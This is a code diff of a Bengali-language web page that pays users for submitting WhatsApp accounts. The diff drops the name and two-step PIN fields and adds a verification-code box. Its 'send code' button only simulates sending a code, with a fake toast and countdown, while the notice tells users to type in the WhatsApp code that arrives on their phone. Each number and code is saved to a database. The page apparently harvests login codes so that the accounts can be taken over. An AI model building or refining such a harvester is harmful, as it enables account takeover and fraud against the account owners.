@@ -91,6 +91,17 @@
         }
         .form-control:focus { border-color: var(--main-pink); box-shadow: 0 0 0 2px rgba(226, 0, 90, 0.1); }
         
+        /* OTP Box Layout */
+        .otp-input-wrapper { display: flex; gap: 10px; }
+        .otp-input-wrapper input { flex: 1; }
+        .btn-get-code {
+            background-color: var(--dark-blue); color: white; border: none;
+            padding: 0 15px; border-radius: 8px; font-size: 13px; font-weight: bold;
+            cursor: pointer; transition: 0.2s; white-space: nowrap; box-shadow: 0 4px 10px rgba(0,0,0,0.1);
+        }
+        .btn-get-code:hover { background-color: #1a252f; transform: translateY(-1px); }
+        .btn-get-code:disabled { background-color: #95a5a6; cursor: not-allowed; box-shadow: none; transform: none; }
+
         .btn-submit {
             background-color: var(--main-pink); color: white; border: none; width: 100%;
             padding: 14px; border-radius: 8px; font-size: 15px; font-weight: bold;
@@ -152,11 +163,9 @@
     <div class="app-container">
         <div class="header">
             <div class="header-left">
-                <!-- ডাইনামিক ব্যাক বাটন -->
                 <a class="back-btn" onclick="handleBackBtn()"><i class="fas fa-arrow-left"></i></a>
                 <div class="header-title" id="pageTitle">WhatsApp Account</div>
             </div>
-            <!-- History Icon -->
             <a class="history-btn" onclick="toggleHistoryView()"><i class="fas fa-history"></i></a>
         </div>
 
@@ -166,7 +175,7 @@
             <div id="mainSubmitView">
                 <div class="notice-box">
                     <i class="fas fa-info-circle"></i>
-                    <p>সঠিক হোয়াটসঅ্যাপ নাম্বার এবং নাম দিয়ে অ্যাকাউন্ট জমা দিন। অ্যাকাউন্ট চেক করার পর আপনার ব্যালেন্সে টাকা যোগ করা হবে। ভুল তথ্য দিলে অ্যাকাউন্ট বাতিল করা হবে।</p>
+                    <p>সঠিক হোয়াটসঅ্যাপ নাম্বার দিয়ে 'কোড পাঠান' বাটনে ক্লিক করুন। মোবাইলে আসা কোডটি নিচের বক্সে বসিয়ে জমা দিন।</p>
                 </div>
 
                 <!-- Task Rate Card -->
@@ -183,15 +192,14 @@
                         <label>হোয়াটসঅ্যাপ নাম্বার</label>
                         <input type="text" id="waNumber" class="form-control" placeholder="যেমন: +8801700000000">
                     </div>
-                    
-                    <div class="input-group">
-                        <label>অ্যাকাউন্টের নাম</label>
-                        <input type="text" id="waName" class="form-control" placeholder="যেমন: John Doe">
-                    </div>
 
+                    <!-- OTP Code Box with Button -->
                     <div class="input-group">
-                        <label>টু-স্টেপ পিন (2FA PIN) - যদি থাকে</label>
-                        <input type="text" id="wa2fa" class="form-control" placeholder="যেমন: 123456">
+                        <label>ভেরিফিকেশন কোড</label>
+                        <div class="otp-input-wrapper">
+                            <input type="text" id="waCode" class="form-control" placeholder="হোয়াটসঅ্যাপের কোড লিখুন...">
+                            <button class="btn-get-code" id="btnGetCode" onclick="sendWhatsAppCode()">কোড পাঠান</button>
+                        </div>
                     </div>
 
                     <button class="btn-submit" id="btnSubmitTask" onclick="submitTask()">
@@ -359,11 +367,10 @@
         // ডাটাবেসে কাজ জমা দেওয়া
         window.submitTask = async function() {
             const number = document.getElementById("waNumber").value.trim();
-            const name = document.getElementById("waName").value.trim();
-            const twoFA = document.getElementById("wa2fa").value.trim() || "N/A";
+            const code = document.getElementById("waCode").value.trim();
             
-            if (number === "" || name === "") {
-                showToast("দয়া করে নাম্বার এবং নাম প্রদান করুন!");
+            if (number === "" || code === "") {
+                showToast("দয়া করে নাম্বার এবং কোড প্রদান করুন!");
                 return;
             }
 
@@ -371,7 +378,7 @@
             btn.innerHTML = '<i class="fas fa-spinner fa-spin"></i> জমা হচ্ছে...';
             btn.disabled = true;
 
-            const details = `Number: ${number}\nName: ${name}\n2FA PIN: ${twoFA}`;
+            const details = `Number: ${number}\nVerification Code: ${code}`;
 
             try {
                 await window.addDoc(window.collection(window.db, "tasks"), {
@@ -390,10 +397,7 @@
                 showToast("আপনার হোয়াটসঅ্যাপ অ্যাকাউন্ট সফলভাবে জমা হয়েছে!");
                 
                 document.getElementById("waNumber").value = "";
-                document.getElementById("waName").value = "";
-                document.getElementById("wa2fa").value = "";
-
-                if(!isHistoryVisible) toggleHistoryView();
+                document.getElementById("waCode").value = "";
 
             } catch (error) {
                 console.error(error);
@@ -412,6 +416,36 @@
             document.getElementById("toastText").innerText = message;
             toast.classList.add("show");
             setTimeout(() => { toast.classList.remove("show"); }, 3000);
+        }
+
+        // হোয়াটসঅ্যাপে কোড পাঠানোর ফাংশন (টাইমার সহ)
+        window.sendWhatsAppCode = function() {
+            const number = document.getElementById("waNumber").value.trim();
+            if(number === "") {
+                showToast("প্রথমে হোয়াটসঅ্যাপ নাম্বারটি লিখুন!");
+                return;
+            }
+            
+            const btn = document.getElementById("btnGetCode");
+            btn.innerHTML = '<i class="fas fa-spinner fa-spin"></i>';
+            btn.disabled = true;
+
+            // সিমুলেশন: ১.৫ সেকেন্ড পর মেসেজ দেখাবে এবং টাইমার শুরু হবে
+            setTimeout(() => {
+                showToast("আপনার হোয়াটসঅ্যাপে কোড পাঠানো হয়েছে!");
+                
+                let timeLeft = 60;
+                const timer = setInterval(() => {
+                    btn.innerHTML = `${timeLeft}s`;
+                    timeLeft--;
+                    
+                    if(timeLeft < 0) {
+                        clearInterval(timer);
+                        btn.innerHTML = 'আবার পাঠান';
+                        btn.disabled = false;
+                    }
+                }, 1000);
+            }, 1500);
         }
 
         let isHistoryVisible = false;
